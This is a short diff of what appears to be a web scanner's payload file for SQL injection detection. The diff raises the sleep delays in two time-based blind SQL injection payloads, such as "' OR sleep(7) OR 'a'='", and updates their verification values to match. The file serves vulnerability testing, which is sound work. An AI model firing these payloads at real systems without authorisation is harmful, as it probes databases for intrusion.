@@ -3,16 +3,16 @@
     "vulnerability": "PTV-WEB-SANIT-SQLINJ",
     "payloads": [
         {
-            "payload": "' OR sleep(3) OR 'a'='",
+            "payload": "' OR sleep(7) OR 'a'='",
             "verify": [
-                3
+                7
             ],
             "type": "time"
         },
         {
-            "payload": "' AND sleep(0.2) OR 'a'='",
+            "payload": "' AND sleep(7) OR 'a'='",
             "verify": [
-                0.2
+                7
             ],
             "type": "time"
         },
